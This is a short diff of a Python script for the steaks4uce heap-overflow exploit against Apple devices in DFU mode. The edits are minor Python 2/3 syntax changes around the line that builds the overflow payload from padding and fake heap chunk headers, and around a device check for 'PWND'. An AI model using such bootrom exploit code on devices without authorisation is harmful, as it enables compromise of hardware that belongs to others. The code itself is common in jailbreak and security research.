@@ -73,7 +73,7 @@ configs = [
 ]
 
 # Pad to length 256 and add heap data for overwrite
-payload = b'\x00' * 256 + struct.pack('<14I',
+payload = '\x00' * 256 + struct.pack('<14I',
               # 1. Allocated chunk to be freed
               # Chunk header: (size 0x8)
         0x84, #   0x00: previous_chunk
@@ -113,7 +113,7 @@ def exploit():
   print ('*** based on steaks4uce exploit (heap overflow) by pod2g ***')
 
   device = dfu.acquire_device()
-  print(('Found:', device.serial_number))
+  print ('Found:', device.serial_number)
 
   if 'PWND:[' in device.serial_number:
     print ('Device is already in pwned DFU Mode. Not executing exploit.')
